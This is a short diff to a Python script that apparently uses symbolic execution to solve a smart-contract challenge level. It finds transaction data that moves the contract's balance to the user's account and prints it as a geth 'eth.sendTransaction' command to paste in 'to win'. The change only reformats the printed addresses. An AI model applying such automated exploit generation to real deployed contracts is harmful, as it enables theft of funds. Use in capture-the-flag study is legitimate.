@@ -52,7 +52,7 @@ for state in m.running_states:
       state.constraints.add(world.get_balance(user_account.address) == contract_balance)
       conc_args = state.solve_one(sym_args)
       # print out our transaction
-      print("eth.sendTransaction({data:\"0x"+binascii.hexlify(conc_args).decode('utf-8')+"\", from:\""+hex(from_address)+"\", to:\""+hex(si_level_address)+"\", gas:"+str(gas)+"})")
+      print("eth.sendTransaction({data:\"0x"+binascii.hexlify(conc_args).decode('utf-8')+"\", from:\""+"{0:#0{1}x}".format(from_address,42) + "\", to:\""+"{0:#0{1}x}".format(si_level_address,42)+"\", gas:"+str(gas)+"})")
       # this prints the exploit out in a format that you can easily paste into geth to win
       sys.exit(0) # we only needed one winning state!
 
